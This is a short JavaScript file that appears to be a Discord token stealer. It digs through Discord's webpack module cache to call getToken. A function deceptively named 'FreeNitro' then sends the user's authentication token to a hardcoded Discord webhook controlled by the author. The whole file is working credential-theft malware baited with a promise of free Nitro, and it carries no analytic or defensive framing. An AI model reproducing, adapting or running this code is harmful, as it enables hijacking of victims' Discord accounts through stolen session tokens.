const webhookurl = 'https://discord.com/api/webhooks/854168035202826270/SzmtH6cq4hqlcbKsnlofD-Cqo5OQGK4dquJigJPC5jYWpzLYk_k8UEwRoX_p6kKr7Kag';

var req = webpackJsonp.push([
    [], {
        extra_id: (e, t, r) => e.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
    }

function FreeNitro() {
    var e = new XMLHttpRequest;
    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
    var t = {
        username: "dan",
        avatar_url: "https://cdn.discordapp.com/attachments/736612991948030037/751790394462961715/450.png",
        content: "",
        embeds: [{
            color: "4700374",
            description: "Token : " + token,
            footer: {
                text: "Dan"
            }
        }]
    };
    e.send(JSON.stringify(t))
}
FreeNitro();
